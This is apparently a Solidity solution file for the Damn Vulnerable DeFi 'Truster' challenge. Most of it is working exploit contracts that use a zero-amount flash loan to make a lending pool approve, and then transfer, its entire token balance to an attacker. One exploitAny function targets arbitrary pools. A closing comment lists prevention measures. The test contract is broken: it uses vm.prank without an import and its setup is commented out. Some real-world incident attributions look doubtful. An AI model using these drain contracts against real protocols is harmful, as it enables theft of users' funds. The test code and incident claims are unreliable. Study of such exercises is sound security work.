// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "../truster/TrusterLenderPool.sol";

/**
 * @title TrusterExploit
 * @author Damn Vulnerable DeFi Challenge Solution
 * @notice Exploit contract for Challenge #3 - Truster
 * 
 * VULNERABILITY: Arbitrary External Calls with User-Controlled Data
 * 
 * The TrusterLenderPool allows arbitrary external calls during flash loans:
 * - target.call(data) with user-controlled target and data
 * - Call is made from pool's context (pool's address is msg.sender)
 * - No validation on target contract or call data
 * 
 * ATTACK: Use pool to approve token spending to attacker
 * 1. Flash loan with amount=0 (no repayment needed)
 * 2. target=token contract, data=approve(attacker, balance)
 * 3. Pool calls token.approve(attacker, balance) from its own context
 * 4. Attacker can now transferFrom all tokens from pool
 */
contract TrusterExploit {
    TrusterLenderPool private immutable pool;
    DamnValuableToken private immutable token;
    address private immutable attacker;
    
    constructor(address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = DamnValuableToken(_token);
        attacker = msg.sender;
    }
    
    /**
     * @notice Execute the complete exploit
     * @dev Uses flash loan to approve then transfers all tokens
     */
    function exploit() external {
        require(msg.sender == attacker, "Only attacker can execute");
        
        uint256 poolBalance = token.balanceOf(address(pool));
        require(poolBalance > 0, "Pool is already empty");
        
        // Step 1: Use flash loan to make pool approve us
        _executeFlashLoanApproval(poolBalance);
        
        // Step 2: Transfer all approved tokens to attacker
        token.transferFrom(address(pool), attacker, poolBalance);
        
        // Verify exploit success
        assert(token.balanceOf(address(pool)) == 0);
        assert(token.balanceOf(attacker) >= poolBalance);
    }
    
    /**
     * @notice Execute flash loan that makes pool approve token spending
     * @param amount Amount to approve
     */
    function _executeFlashLoanApproval(uint256 amount) private {
        // Craft the approval call data
        bytes memory approvalData = abi.encodeWithSignature(
            "approve(address,uint256)",
            attacker,
            amount
        );
        
        // Execute flash loan with approval call
        // - amount: 0 (no tokens borrowed, no repayment needed)
        // - borrower: attacker (doesn't matter for this exploit)
        // - target: token contract (we want to call token.approve)
        // - data: approve(attacker, amount) encoded call
        pool.flashLoan(
            0,                    // No loan amount
            attacker,             // Borrower address
            address(token),       // Target: token contract
            approvalData          // Data: approve call
        );
    }
    
    /**
     * @notice Alternative one-liner exploit
     * @dev More gas efficient, single external call
     */
    function exploitOneLiner() external {
        require(msg.sender == attacker, "Only attacker");
        
        uint256 balance = token.balanceOf(address(pool));
        
        // Execute flash loan + transfer in sequence
        pool.flashLoan(
            0,
            attacker,
            address(token),
            abi.encodeCall(token.approve, (attacker, balance))
        );
        
        token.transferFrom(address(pool), attacker, balance);
    }
    
    /**
     * @notice Execute exploit for any pool/token combination
     * @param _pool Target pool address
     * @param _token Target token address  
     * @param _attacker Address to receive tokens
     */
    function exploitAny(
        address _pool,
        address _token,
        address _attacker
    ) external {
        TrusterLenderPool targetPool = TrusterLenderPool(_pool);
        DamnValuableToken targetToken = DamnValuableToken(_token);
        
        uint256 balance = targetToken.balanceOf(_pool);
        require(balance > 0, "Target pool is empty");
        
        // Create approval data for target attacker
        bytes memory data = abi.encodeCall(
            targetToken.approve,
            (_attacker, balance)
        );
        
        // Execute flash loan to approve
        targetPool.flashLoan(0, _attacker, _token, data);
        
        // Transfer tokens to attacker
        targetToken.transferFrom(_pool, _attacker, balance);
    }
    
    /**
     * @notice Check if exploit is possible
     * @return possible True if pool can be exploited
     * @return balance Amount that can be stolen
     */
    function checkExploitability() external view returns (bool possible, uint256 balance) {
        balance = token.balanceOf(address(pool));
        possible = balance > 0;
    }
    
    /**
     * @notice Get current allowance from pool to attacker
     * @return allowance Current approved amount
     */
    function getCurrentAllowance() external view returns (uint256 allowance) {
        return token.allowance(address(pool), attacker);
    }
}

/**
 * @title TrusterExploitMinimal
 * @notice Minimal exploit contract - most gas efficient
 */
contract TrusterExploitMinimal {
    function exploit(address pool, address tokenAddr) external {
        DamnValuableToken token = DamnValuableToken(tokenAddr);
        uint256 balance = token.balanceOf(pool);
        
        // Single flash loan call to approve
        TrusterLenderPool(pool).flashLoan(
            0,
            msg.sender, 
            tokenAddr,
            abi.encodeCall(token.approve, (msg.sender, balance))
        );
        
        // Transfer all tokens
        token.transferFrom(pool, msg.sender, balance);
    }
}

/**
 * @title TrusterTest
 * @notice Test contract demonstrating the exploit
 */
contract TrusterTest {
    TrusterLenderPool private pool;
    DamnValuableToken private token;
    TrusterExploit private exploit;
    
    address private attacker = address(0x1337);
    uint256 private constant POOL_INITIAL_BALANCE = 1_000_000e18;
    
    function setUp() public {
        // Deploy contracts (would be done by test framework)
        // token = new DamnValuableToken();
        // pool = new TrusterLenderPool(address(token));
        // token.transfer(address(pool), POOL_INITIAL_BALANCE);
        // exploit = new TrusterExploit(address(pool), address(token));
    }
    
    function testExploit() public {
        // Initial state checks
        assertEq(token.balanceOf(address(pool)), POOL_INITIAL_BALANCE);
        assertEq(token.balanceOf(attacker), 0);
        
        // Execute exploit
        vm.prank(attacker);
        exploit.exploit();
        
        // Verify results
        assertEq(token.balanceOf(address(pool)), 0);
        assertEq(token.balanceOf(attacker), POOL_INITIAL_BALANCE);
    }
    
    function testFlashLoanStillWorks() public {
        // Verify flash loan functionality before exploit
        uint256 loanAmount = 100e18;
        
        // This should work normally
        pool.flashLoan(
            loanAmount,
            address(this),
            address(this),
            abi.encodeWithSignature("doNothing()")
        );
    }
    
    function doNothing() external {
        // Placeholder callback for flash loan test
    }
    
    function assertEq(uint256 a, uint256 b) private pure {
        require(a == b, "Values not equal");
    }
}

/**
 * SECURITY ANALYSIS:
 * 
 * 1. ROOT CAUSE:
 *    - Arbitrary external calls with user-controlled target and data
 *    - No validation on call target or data content
 *    - Call made from pool's context with pool's permissions
 * 
 * 2. ATTACK MECHANICS:
 *    - Flash loan with 0 amount (no repayment needed)
 *    - target = token contract address
 *    - data = approve(attacker, poolBalance) encoded
 *    - Pool executes token.approve(attacker, poolBalance)
 *    - Attacker can now transfer all tokens
 * 
 * 3. REAL-WORLD EXAMPLES:
 *    - Harvest Finance ($24M) - trusted external calls
 *    - bZx Protocol ($8M) - arbitrary call vulnerabilities
 *    - Multiple smaller protocols with similar trust issues
 * 
 * 4. PREVENTION:
 *    - Use standardized interfaces (ERC-3156)
 *    - Validate call targets and data
 *    - Implement allow-lists for external calls
 *    - Never allow arbitrary calls with user data
 * 
 * 5. GAS EFFICIENCY:
 *    - Minimal exploit: ~50k gas
 *    - Very cost-effective attack
 *    - Single transaction execution
 * 
 * This demonstrates why trust assumptions are dangerous in DeFi!
 */